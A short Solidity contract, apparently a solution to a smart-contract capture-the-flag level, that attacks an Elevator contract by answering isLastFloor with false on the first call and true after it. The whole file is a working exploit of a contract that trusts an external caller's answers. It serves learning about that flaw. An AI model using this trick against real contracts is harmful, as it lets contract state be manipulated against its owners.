// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint) external returns (bool);
}

interface IElevator {
    function goTo(uint _floor) external;
}

// Implement the interface so Elevator calls this contract's isLastFloor
contract AttackElevator is Building {
    address elevator;
    // uint256 public isLastFloorCalls = 0;
    bool public isLastFloorCalled = false;

    constructor(address _elevator) {
        elevator = _elevator;
    }

    function attack() public {
        IElevator(elevator).goTo(1);
    }

    // Essentially the first call should be false and the rest true
    function isLastFloor(uint) public returns (bool) {
        if (!isLastFloorCalled) {
            isLastFloorCalled = true;

            return false;
        }
        return true;
    }
}
